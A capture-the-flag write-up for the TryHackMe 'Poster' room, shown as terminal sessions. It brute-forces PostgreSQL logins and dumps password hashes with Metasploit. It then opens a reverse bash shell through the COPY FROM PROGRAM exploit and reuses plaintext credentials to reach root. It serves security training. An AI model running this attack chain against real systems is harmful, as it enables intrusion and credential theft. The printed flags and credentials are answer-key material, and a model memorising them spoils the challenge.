| Category          | Details                                     |
|-------------------|---------------------------------------------|
| 📝 **Name**       | [Poster](https://tryhackme.com/room/poster) |  
| 🏷 **Type**       | THM Challenge                               |
| 🖥 **OS**         | Linux                                       |
| 🎯 **Difficulty** | Easy                                        |
| 📁 **Tags**       | PostgreSQL, Metasploit, password reuse      |

## Task 1: Flag

### What is the rdbms installed on the server?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Poster]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 07:27 +0100
Nmap scan report for 10.82.130.177
Host is up (0.048s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.67 seconds
```
We can see `PostgreSQL` RDBMS running on target.

### What port is the rdbms running on?
`nmap` detected `PostgreSQL` running at port `5432`

### After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

#### Search for PostgreSQL enumeration Metasploit module
```
msf > search aux postgres user login
<SNIP>
   0  auxiliary/scanner/postgres/postgres_login  .                normal  No     PostgreSQL Login Utility
<SNIP>
msf > info auxiliary/scanner/postgres/postgres_login
<SNIP>
Description:
  This module attempts to authenticate against a PostgreSQL
  instance using username and password combinations indicated
  by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that
  passwords may be either plaintext or MD5 formatted hashes.
<SNIP>
```

### What are the credentials you found?

#### Enumerate credentials using `auxiliary/scanner/postgres/postgres_login`
```
msf > use auxiliary/scanner/postgres/postgres_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.82.130.177
RHOSTS => 10.82.130.177
msf auxiliary(scanner/postgres/postgres_login) > run
[!] 10.82.130.177:5432    - No active DB -- Credential data will not be saved!
<SNIP>
[-] 10.82.130.177:5432    - 10.82.130.177:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.82.130.177:5432    - 10.82.130.177:5432 - Login Successful: postgres:password@template1
[-] 10.82.130.177:5432    - 10.82.130.177:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
<SNIP>
[*] 10.82.130.177:5432    - Scanned 1 of 1 hosts (100% complete)
[*] 10.82.130.177:5432    - Bruteforce completed, 1 credential was successful.
[*] 10.82.130.177:5432    - You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

### What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

#### Search for PostgreSQL query execution Metasploit module
```
msf auxiliary(scanner/postgres/postgres_login) > search aux postgre query
<SNIP>
   0  auxiliary/admin/postgres/postgres_readfile  .                normal  No     PostgreSQL Server Generic Query
   1  auxiliary/admin/postgres/postgres_sql       .                normal  No     PostgreSQL Server Generic Query
<SNIP>
msf auxiliary(scanner/postgres/postgres_login) > info auxiliary/admin/postgres/postgres_sql
<SNIP>
Description:
  This module will allow for simple SQL statements to be executed against a
  PostgreSQL instance given the appropriate credentials.
<SNIP>
```

### Based on the results of #6, what is the rdbms version installed on the server?

#### Use `auxiliary/admin/postgres/postgres_sql` to check PostgreSQL version
```
msf auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql
msf auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.82.130.177
RHOSTS => 10.82.130.177
msf auxiliary(admin/postgres/postgres_sql) > set USERNAME postgres
USERNAME => postgres
msf auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.82.130.177
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

### What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

#### Search for PostgreSQL user hashes dumping Metasploit module
```
msf auxiliary(admin/postgres/postgres_sql) > search aux postgre hashdump
<SNIP>
   4  auxiliary/scanner/postgres/postgres_hashdump  .                normal  No     Postgres Password Hashdump
<SNIP>
msf auxiliary(admin/postgres/postgres_sql) > info auxiliary/scanner/postgres/postgres_hashdump
<SNIP>
  This module extracts the usernames and encrypted password
  hashes from a Postgres server and stores them for later cracking.
<SNIP>
```

### How many user hashes does the module dump?

#### Dump PostgreSQL user hashes
```
msf auxiliary(admin/postgres/postgres_sql) > use auxiliary/scanner/postgres/postgres_hashdump
msf auxiliary(scanner/postgres/postgres_hashdump) > set RHOSTS 10.82.130.177
RHOSTS => 10.82.130.177
msf auxiliary(scanner/postgres/postgres_hashdump) > set USERNAME postgres
USERNAME => postgres
msf auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password
PASSWORD => password
msf auxiliary(scanner/postgres/postgres_hashdump) > run
[+] 10.82.130.177:5432 - Query appears to have run successfully
[+] 10.82.130.177:5432 - Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] 10.82.130.177:5432 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

#### Search for PostgreSQL file read Metasploit module
```
msf auxiliary(scanner/postgres/postgres_hashdump) > search aux postgre file read
<SNIP>
   1  auxiliary/admin/postgres/postgres_readfile  .                normal  No     PostgreSQL Server Generic Query
<SNIP>
msf auxiliary(scanner/postgres/postgres_hashdump) > info auxiliary/admin/postgres/postgres_readfile
<SNIP>
Description:
  This module imports a file local on the PostgreSQL Server into a
  temporary table, reads it, and then drops the temporary table.
  It requires PostgreSQL credentials with table CREATE privileges
  as well as read privileges to the target file.
<SNIP>
```

### What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

#### Search for PostgreSQL command execution Metasploit module
```
msf auxiliary(scanner/postgres/postgres_hashdump) > search exploit postgre command execution
<SNIP>
   4   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   5     \_ target: Automatic                                      .                .          .      .
   6     \_ target: Unix/OSX/Linux                                 .                .          .      .
   7     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   8     \_ target: Windows (CMD)                                  .                .          .      .
<SNIP>
msf auxiliary(scanner/postgres/postgres_hashdump) > info exploit/multi/postgres/postgres_copy_from_program_cmd_exec
<SNIP>
Description:
  Installations running Postgres 9.3 and above have functionality which allows for the superuser
  and users with 'pg_execute_server_program' to pipe to and from an external program using COPY.
  This allows arbitrary command execution as though you have console access.
<SNIP>
```

### Compromise the machine and locate user.txt

#### Spawn reverse shell connection using `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`
```
msf auxiliary(scanner/postgres/postgres_hashdump) > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS 10.82.130.177
RHOSTS => 10.82.130.177
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set USERNAME postgres
USERNAME => postgres
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PASSWORD password
PASSWORD => password
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PAYLOAD payload/cmd/unix/reverse_bash
PAYLOAD => cmd/unix/reverse_bash
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST tun0
LHOST => 192.168.130.56
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LPORT 4444
LPORT => 4444
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
[*] Started reverse TCP handler on 192.168.130.56:4444 
[*] 10.82.130.177:5432 - 10.82.130.177:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.82.130.177:5432 - Exploiting...
[+] 10.82.130.177:5432 - 10.82.130.177:5432 - R3yPTUelZQQI dropped successfully
[+] 10.82.130.177:5432 - 10.82.130.177:5432 - R3yPTUelZQQI created successfully
[+] 10.82.130.177:5432 - 10.82.130.177:5432 - R3yPTUelZQQI copied successfully(valid syntax/command)
[+] 10.82.130.177:5432 - 10.82.130.177:5432 - R3yPTUelZQQI dropped successfully(Cleaned)
[*] 10.82.130.177:5432 - Exploit Succeeded
[*] Command shell session 1 opened (192.168.130.56:4444 -> 10.82.130.177:38664) at 2026-01-27 09:15:13 +0100

/usr/bin/script -qc /bin/bash /dev/null
postgres@ubuntu:/var/lib/postgresql/9.5/main$ id
id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

#### Discover user `dark` credentials in plaintext in `/home/dark/credentials.txt`
```
postgres@ubuntu:/$ cat /home/dark/credentials.txt
dark:qwerty1234#!hackme
```

#### Access target over SSH using `dark:qwerty1234#!hackme` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Poster]
└─$ ssh dark@$TARGET
<SNIP>
$ id
uid=1001(dark) gid=1001(dark) groups=1001(dark)
```

#### Discover database credentials in `/var/www/html/config.php`
```
$ cat /var/www/html/config.php
<SNIP>
        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
<SNIP>
```

#### Reuse discovered credentials to gain access as user `alison`
```
$ su alison
Password: 
alison@ubuntu:/$ id
uid=1000(alison) gid=1000(alison) groups=1000(alison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

#### Capture user flag
```
alison@ubuntu:/$ cat /home/alison/user.txt 
THM{postgresql_fa1l_conf1gurat1on}
```

### Escalate privileges and obtain root.txt

#### List allowed `sudo` commands
```
alison@ubuntu:/$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```
User `alison` is effectively `root`.

#### Capture root flag
```
alison@ubuntu:/$ sudo cat /root/root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```
